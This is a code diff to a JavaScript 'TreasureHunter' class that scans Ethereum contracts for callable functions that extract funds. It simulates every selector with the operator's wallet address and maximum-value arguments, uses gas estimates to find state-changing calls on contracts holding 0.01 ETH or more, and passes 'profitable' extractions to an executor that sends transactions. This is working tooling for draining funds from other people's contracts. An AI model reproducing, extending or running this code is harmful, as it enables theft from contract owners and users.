@@ -400,11 +400,13 @@ class TreasureHunter {
 
   async simulateExtractions(contracts) {
     const treasures = [];
+    const MIN_ETH_FOR_DEEP_SIM = BigInt('10000000000000000'); // 0.01 ETH
 
     for (const c of contracts) {
       if (c.destroyed) continue;
 
       const hasValue = c.ethBalance > 0n || (c.tokenBalances && Object.keys(c.tokenBalances).length > 0);
+      const highValue = c.ethBalance >= MIN_ETH_FOR_DEEP_SIM;
 
       // Simulate ALL selectors on contracts with value
       if (hasValue) {
@@ -418,49 +420,101 @@ class TreasureHunter {
         }
         c.simResults = simResults;
 
-        // Check which extraction functions succeed
+        // Check which KNOWN extraction functions succeed
         const successfulExtractions = simResults.filter(s =>
           s.success && EXTRACTION_SELECTORS[s.selector]
         );
 
-        if (successfulExtractions.length > 0) {
+        // === UNKNOWN SELECTOR EXPLORER ===
+        // For contracts with ETH >= 0.01, find ALL unknown selectors that succeed.
+        // Then estimate gas to filter out view functions (gas <= 26K).
+        // What remains are state-changing callable functions on funded contracts
+        // that we have NO hardcoded rule for — pure emergent discovery.
+        const unknownCallables = simResults.filter(s =>
+          s.success && !EXTRACTION_SELECTORS[s.selector]
+        );
+
+        if (highValue && unknownCallables.length > 0) {
+          // Deduplicate by selector (keep first successful arg pattern)
+          const seen = new Set();
+          const uniqueUnknowns = unknownCallables.filter(s => {
+            const key = s.selector + ':' + s.argPattern;
+            if (seen.has(key)) return false;
+            seen.add(key);
+            return true;
+          });
+
+          // Estimate gas on each unknown callable
+          const withGas = await this.estimateGasForCallables(c.address, uniqueUnknowns);
+
+          // Filter: gas > 26K = state-changing (not a view function)
+          const stateChanging = withGas.filter(s => s.gasEstimate && s.gasEstimate > 26000);
+
+          if (stateChanging.length > 0) {
+            c.unknownCallables = stateChanging.map(s => ({
+              selector: s.selector,
+              argPattern: s.argPattern,
+              gasEstimate: s.gasEstimate,
+              result: s.result?.substring(0, 130),
+            }));
+
+            log.info(`DISCOVERY: ${c.address} (${c.ethBalanceFormatted})`);
+            log.info(`  ${stateChanging.length} unknown state-changing callable(s):`);
+            for (const s of stateChanging) {
+              log.info(`    0x${s.selector} [${s.argPattern}] gas=${s.gasEstimate}`);
+            }
+          }
+        }
+
+        // Flag as treasure if known extraction functions OR unknown callables found
+        const hasKnownExtractions = successfulExtractions.length > 0;
+        const hasUnknownCallables = c.unknownCallables && c.unknownCallables.length > 0;
+
+        if (hasKnownExtractions || hasUnknownCallables) {
           c.treasure = true;
           c.profitableActions = successfulExtractions;
           treasures.push(c);
 
-          log.info(`TREASURE: ${c.address}`);
-          log.info(`  ETH: ${c.ethBalanceFormatted}`);
-          if (c.tokenBalances) {
-            for (const [sym, bal] of Object.entries(c.tokenBalances)) {
-              log.info(`  ${sym}: ${bal}`);
-            }
-          }
-          log.info(`  Callable extraction functions:`);
-          for (const s of successfulExtractions) {
-            log.info(`    ${EXTRACTION_SELECTORS[s.selector]} (${s.selector}) -> ${s.result?.substring(0, 66) || 'ok'}`);
-          }
-
-          // Run through executor — checks gas cost, calculates profit, executes if EXECUTE=1
-          for (const s of successfulExtractions) {
-            const execResult = await this.executor.evaluate({
-              target: c.address,
-              callData: s.callData,
-              fnName: s.name,
-              contractEthBalance: c.ethBalance,
-              contractTokenBalances: c.tokenBalances,
-            });
-
-            if (execResult.profitable) {
-              log.info(`*** PROFITABLE: ${execResult.profitEth.toFixed(6)} ETH from ${c.address} via ${s.name}`);
-              if (execResult.executed) {
-                log.info(`*** TX SENT: ${execResult.txHash}`);
+          if (hasKnownExtractions) {
+            log.info(`TREASURE (known): ${c.address}`);
+            log.info(`  ETH: ${c.ethBalanceFormatted}`);
+            if (c.tokenBalances) {
+              for (const [sym, bal] of Object.entries(c.tokenBalances)) {
+                log.info(`  ${sym}: ${bal}`);
               }
             }
+            log.info(`  Callable extraction functions:`);
+            for (const s of successfulExtractions) {
+              log.info(`    ${EXTRACTION_SELECTORS[s.selector]} (${s.selector}) -> ${s.result?.substring(0, 66) || 'ok'}`);
+            }
+
+            // Run through executor for known extractions
+            for (const s of successfulExtractions) {
+              const execResult = await this.executor.evaluate({
+                target: c.address,
+                callData: s.callData,
+                fnName: s.name,
+                contractEthBalance: c.ethBalance,
+                contractTokenBalances: c.tokenBalances,
+              });
+
+              if (execResult.profitable) {
+                log.info(`*** PROFITABLE: ${execResult.profitEth.toFixed(6)} ETH from ${c.address} via ${s.name}`);
+                if (execResult.executed) {
+                  log.info(`*** TX SENT: ${execResult.txHash}`);
+                }
+              }
+            }
+          }
+
+          if (hasUnknownCallables) {
+            log.info(`TREASURE (unknown): ${c.address} — ${c.unknownCallables.length} unknown callable(s) on contract with ${c.ethBalanceFormatted}`);
           }
         }
       }
 
-      // Vectorize every contract (with or without value) for training
+      // Vectorize every contract (with or without value) for training.
+      // Now includes unknownCallables data for the neural net to learn from.
       this.vectorizer.vectorize(c);
     }
 
@@ -471,25 +525,36 @@ class TreasureHunter {
     const results = [];
     const { address, selectors } = contract;
 
-    // Build simulation calls for every selector
-    // Try with no args, then with our address as arg
+    // Build simulation calls for EVERY selector — not just known ones.
+    // Try multiple arg patterns: no args, our address, uint256 max, zero args.
+    // The goal is emergent discovery: find callable functions we never programmed.
     const calls = [];
     for (const sel of selectors) {
-      // No args
+      const known = EXTRACTION_SELECTORS[sel];
+
+      // No args (covers 0-arg functions)
       calls.push({
         selector: sel,
         callData: '0x' + sel,
-        name: EXTRACTION_SELECTORS[sel] || `unknown(${sel})`,
+        name: known || `unknown(${sel})`,
+        argPattern: 'no_args',
       });
 
-      // With our address as single arg (covers withdraw(address), sweep(address), etc)
-      if (EXTRACTION_SELECTORS[sel] && EXTRACTION_SELECTORS[sel].includes('address')) {
-        calls.push({
-          selector: sel,
-          callData: '0x' + sel + padAddress(OUR_WALLET),
-          name: EXTRACTION_SELECTORS[sel] + ' [with our addr]',
-        });
-      }
+      // With our address as single arg (covers fn(address) patterns)
+      calls.push({
+        selector: sel,
+        callData: '0x' + sel + padAddress(OUR_WALLET),
+        name: (known || `unknown(${sel})`) + ' [addr]',
+        argPattern: 'address',
+      });
+
+      // With uint256 max as single arg (covers fn(uint256) like withdraw(amount))
+      calls.push({
+        selector: sel,
+        callData: '0x' + sel + 'f'.repeat(64),
+        name: (known || `unknown(${sel})`) + ' [uint_max]',
+        argPattern: 'uint256_max',
+      });
     }
 
     // Batch simulate via eth_call — wrapped in try/catch per batch
@@ -505,9 +570,8 @@ class TreasureHunter {
       try {
         responses = await this.rpc.batch(rpcCalls);
       } catch (err) {
-        // Entire batch failed — mark all as failed, continue
         for (const c of chunk) {
-          results.push({ selector: c.selector, name: c.name, callData: c.callData, success: false, result: null, error: err.message });
+          results.push({ selector: c.selector, name: c.name, callData: c.callData, argPattern: c.argPattern, success: false, result: null, error: err.message });
         }
         continue;
       }
@@ -519,10 +583,47 @@ class TreasureHunter {
           selector: chunk[j].selector,
           name: chunk[j].name,
           callData: chunk[j].callData,
+          argPattern: chunk[j].argPattern,
           success,
           result: success ? resp : null,
           error: !success ? (resp?.error?.message || resp?.message || 'failed') : null,
         });
+      }
+    }
+
+    return results;
+  }
+
+  // Estimate gas for successful unknown selectors to distinguish state-changing
+  // functions (gas > 26K) from view/pure functions (gas ~21K).
+  async estimateGasForCallables(address, callables) {
+    const results = [];
+    const BATCH = 10;
+
+    for (let i = 0; i < callables.length; i += BATCH) {
+      const chunk = callables.slice(i, i + BATCH);
+      const rpcCalls = chunk.map(c => ({
+        method: 'eth_estimateGas',
+        params: [{ from: OUR_WALLET, to: address, data: c.callData, value: '0x0' }],
+      }));
+
+      let responses;
+      try {
+        responses = await this.rpc.batch(rpcCalls);
+      } catch (err) {
+        for (const c of chunk) {
+          results.push({ ...c, gasEstimate: null, gasError: err.message });
+        }
+        continue;
+      }
+
+      for (let j = 0; j < chunk.length; j++) {
+        const resp = responses[j];
+        if (resp && !resp.error && typeof resp === 'string') {
+          results.push({ ...chunk[j], gasEstimate: parseInt(resp, 16) });
+        } else {
+          results.push({ ...chunk[j], gasEstimate: null, gasError: resp?.error?.message || 'estimate failed' });
+        }
       }
     }
 
@@ -558,7 +659,15 @@ class TreasureHunter {
           callData: a.callData,
           result: a.result?.substring(0, 130),
         })),
+        // Unknown callable selectors — state-changing functions we have no rule for.
+        // These are the emergent discoveries for the neural net to learn from.
+        unknownCallables: t.unknownCallables || [],
+        discoveryType: t.unknownCallables?.length > 0
+          ? (t.profitableActions?.length > 0 ? 'known+unknown' : 'unknown_only')
+          : 'known',
         isProxy: t.isProxy,
+        proxyType: t.proxyType || null,
+        implementation: t.implementation || null,
         hasSelfdestruct: t.hasSelfdestruct,
       })),
       allContracts: undefined, // set below for full report
